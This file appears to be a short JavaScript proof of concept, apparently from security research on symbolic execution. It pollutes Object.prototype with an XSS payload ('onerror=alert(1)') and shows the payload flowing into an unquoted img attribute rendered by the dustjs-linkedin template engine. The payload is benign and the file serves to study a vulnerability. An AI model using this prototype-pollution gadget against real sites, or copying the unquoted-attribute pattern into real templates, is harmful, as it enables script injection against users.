var dust = require('dustjs-linkedin');


try{
    Object._expose.setupSymbols()
}
catch(e){
    console.log("[!] symbolic execution not enabled")
}

// arbitrary value interpolation
Object.prototype.rootdir = "; onerror=alert(1);//"

var tmpl = dust.compile("{#names}<img src={rootdir}/{name}>{~n}{/names}", "templateName");
dust.loadSource(tmpl);

dust.render("templateName", { rootdir: "gg", names: [ { name: "Moe" }, { name: "Larry" }, { name: "Curly" } ] }, function(err, out) {
    if(err) console.error(err);
    else console.log(out);
});